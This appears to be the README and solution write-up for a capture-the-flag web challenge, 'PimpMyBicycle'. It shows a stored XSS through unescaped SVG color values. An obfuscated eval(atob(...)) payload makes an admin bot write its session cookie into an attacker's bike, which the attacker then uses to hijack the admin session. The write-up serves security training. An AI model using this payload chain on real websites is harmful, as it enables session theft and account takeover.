# PimpMyBicycle - hard

Your friend just had an idea: allow everyone to create the bike of their dream !
He asks you to verify if his website is secure, since you're the best pentester he knows.

**Find a way to access the admin page**

*note: admin doesn't have access to the internet ! He is behind a very restrictive firewall, and he can only be on his own website*

FLAG: PWNME{[A-Za-z0-9_]}


# Install

`docker-compose up -d`

- will start http application on port 80
<!-- - bot is on 3000 (only used by main app, do not expose bot on internet) -->

# Exploit (Solution)

- In order to view admin page, we need to find an xss.
- Then, we'll need to find a way to leak the page or the cookie, without accessing an exterior website, since the admin can't access exterior.

## Interesting routes

```
Edit a bike:
POST
/?page=preview&action=editBike&id=10
data=[{"id":"roue1","slot":0,"colors":["#00ff00","#00ff00"]},{"id":"roue0","slot":1,"colors":["#00ff00","#00ff00"]},{"id":"guidon1","slot":2,"colors":["#00ff00"]},{"id":"selle0","slot":3,"colors":["#00ff00"]},{"id":"cadre2","slot":4,"colors":["#00ff00"]}]
```


note: if we try to edit a bike that doesn't belong to us, this error is shown:

`This bike doesn't belong to you ! You can edit other bikes only if you're admin.`

We can play with the data parameter, to find an xss.

The colors aren't parsed, and display directly in svg. We can trigger an xss from this:

```
Payload
POST
/?page=preview&action=editBike&id=10
data=[{"id":"roue1","slot":0,"colors":["\"><script>alert(0)</script>","#00ff00"]},{"id":"roue0","slot":1,"colors":["#00ff00","#00ff00"]},{"id":"guidon1","slot":2,"colors":["#00ff00"]},{"id":"selle0","slot":3,"colors":["#00ff00"]},{"id":"cadre2","slot":4,"colors":["#00ff00"]}]
```

XSS is trigger on preview page.

Now that we have an xss, we need to find a way to leak the session cookie to admin.

Admin can't access any website, so we can't send the cookie on an interceptor.

But, like we've previously seen, an admin can edit any bike.

To get the cookie, we can force the admin to edit our bike, and set his cookie in a color field.

```
Payload to execute on admin (we can use jquery, since it's on the preview page)
$.post('/?page=preview&id=9&action=editBike', {data:'[{"id":"roue1","slot":0,"colors":["'+document.cookie+'","#ff0000"]},{"id":"roue0","slot":1,"colors":["#ff0000","#ff0000"]},{"id":"guidon1","slot":2,"colors":["#ff0000"]},{"id":"selle0","slot":3,"colors":["#ff0000"]},{"id":"cadre2","slot":4,"colors":["#ff0000"]}]'})
```

To execute this payload, we're going to need to convert it in base64 first, then put it in our XSS previously found:

```
Payload encoded:

<script>eval(atob('JC5wb3N0KCcvP3BhZ2U9cHJldmlldyZpZD0xMCZhY3Rpb249ZWRpdEJpa2UnLCB7ZGF0YTonW3siaWQiOiJyb3VlMSIsInNsb3QiOjAsImNvbG9ycyI6WyInK2RvY3VtZW50LmNvb2tpZSsnIiwiI2ZmMDAwMCJdfSx7ImlkIjoicm91ZTAiLCJzbG90IjoxLCJjb2xvcnMiOlsiI2ZmMDAwMCIsIiNmZjAwMDAiXX0seyJpZCI6Imd1aWRvbjEiLCJzbG90IjoyLCJjb2xvcnMiOlsiI2ZmMDAwMCJdfSx7ImlkIjoic2VsbGUwIiwic2xvdCI6MywiY29sb3JzIjpbIiNmZjAwMDAiXX0seyJpZCI6ImNhZHJlMiIsInNsb3QiOjQsImNvbG9ycyI6WyIjZmYwMDAwIl19XSd9KQ=='))</script>

```

```
Final payload
POST
/?page=preview&id=9&action=editBike
data=[{"id":"roue1","slot":0,"colors":["\"><script>eval(atob('JC5wb3N0KCcvP3BhZ2U9cHJldmlldyZpZD0xMCZhY3Rpb249ZWRpdEJpa2UnLCB7ZGF0YTonW3siaWQiOiJyb3VlMSIsInNsb3QiOjAsImNvbG9ycyI6WyInK2RvY3VtZW50LmNvb2tpZSsnIiwiI2ZmMDAwMCJdfSx7ImlkIjoicm91ZTAiLCJzbG90IjoxLCJjb2xvcnMiOlsiI2ZmMDAwMCIsIiNmZjAwMDAiXX0seyJpZCI6Imd1aWRvbjEiLCJzbG90IjoyLCJjb2xvcnMiOlsiI2ZmMDAwMCJdfSx7ImlkIjoic2VsbGUwIiwic2xvdCI6MywiY29sb3JzIjpbIiNmZjAwMDAiXX0seyJpZCI6ImNhZHJlMiIsInNsb3QiOjQsImNvbG9ycyI6WyIjZmYwMDAwIl19XSd9KQ'))</script>","#00ff00"]},{"id":"roue0","slot":1,"colors":["#00ff00","#00ff00"]},{"id":"guidon1","slot":2,"colors":["#00ff00"]},{"id":"selle0","slot":3,"colors":["#00ff00"]},{"id":"cadre2","slot":4,"colors":["#00ff00"]}]
```

Do not preview the bike yourself, because it will trigger the payload, and set your own cookie in color slot !

Send it to review with:

```
POST
/?page=sendBike
id=10
```

Wait few second for the review confirmation messsage.

Then, you can go to the preview page, and retreive the cookie in the color slot !

or go to `/?page=preview&id=10&action=getBike` to get the JSON bike directly


Set session cookie, and go to /?page=admin page to get the flag
